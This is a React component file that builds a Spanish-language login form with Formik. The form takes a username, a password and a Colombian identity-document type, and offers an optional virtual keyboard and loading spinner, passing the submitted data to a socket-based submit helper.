import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordError } from './UsernameAndPasswordError'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import { UsernameAndPasswordKeyword } from './UsernameAndPasswordKeyword'

const valuesData = { username: '', password: '', typeDocument: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext);
    const { socket } =  useContext(SocketContext);  
    
    const [showSpiner , SetshowSpiner] = useState(false);

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('');
    const [selectActive, setSelectActive] = useState(false);
    const [selectItem, setSelectItem] = useState(opciones[0]);
    
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        // En caso de poner un error personalizado colocar errorUsername y errorPassword
        validate: values => usernameAndPasswordValidate({values, virtualKeyword}),
        onSubmit: async(valuesData) => {
            valuesData.typeDocument = selectItem;

            submitBase({dataImportant, valuesData, endUrl})
        }
    })
    
    return (
        <div>
            {/* Spiner de carga */}
            {
                showSpiner === true ? <Spiner /> : null
            }

            {/* Aqui ira las notificacion de error en caso general */}
            <UsernameAndPasswordError
                touched={touched}
                errors={errors}
            />
            {
                virtualKeyword === true ? (<UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) : null
            }
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <UsernameAndPasswordInput
                    username={values.username}
                    password={values.password}
                    typeDocument={values.typeDocument}
                    handleChange={handleChange} 
                    handleBlur={handleBlur}
                    touched={touched}
                    errors={errors}
                    virtualKeyword={virtualKeyword}
                    valueKeyBoardVirtual={valueKeyBoardVirtual}
                    showPasswordMode={false}

                    selectActive={selectActive} 
                    setSelectActive={setSelectActive}
                    selectItem={selectItem}
                    setSelectItem={setSelectItem}
                    opciones={opciones}
                />

                <button 
                        disabled={
                            (
                                touched.username && 
                                errors.username || 
                                values.username.length === 0
                            ) 
                            || 
                            (
                                virtualKeyword == true 
                                    ? valueKeyBoardVirtual.length < 1 
                                    : (
                                        touched.password && 
                                        errors.password || 
                                        values.password.length === 0
                                    )
                            ) == true ? true : false
                        }
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
